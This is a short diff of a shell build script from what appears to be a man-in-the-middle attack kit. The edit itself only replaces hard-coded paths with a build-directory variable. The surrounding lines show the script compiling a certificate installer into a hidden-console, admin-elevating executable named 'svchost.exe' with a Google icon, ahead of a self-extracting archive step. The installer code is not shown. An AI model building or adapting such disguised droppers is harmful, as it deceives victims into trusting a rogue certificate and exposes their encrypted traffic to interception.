@@ -163,16 +163,16 @@ if __name__ == "__main__":
     s.exit(0)
 EOF
 
+cd "$BUILD_DIR"
 cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
 cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 
-cd /root/.wine/drive_c/pyinstaller-build
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "svchost.exe" \
     --uac-admin "C:\\pyinstaller-build\\cert_installer.py"
 
-cp -r "/root/.wine/drive_c/pyinstaller-build/dist/svchost.exe" "$MITM_DIR/svchost.exe"
+cp -r "$BUILD_DIR/dist/svchost.exe" "$MITM_DIR/svchost.exe"
 
 # ========================
 # --- CREATE RAR SFX ---
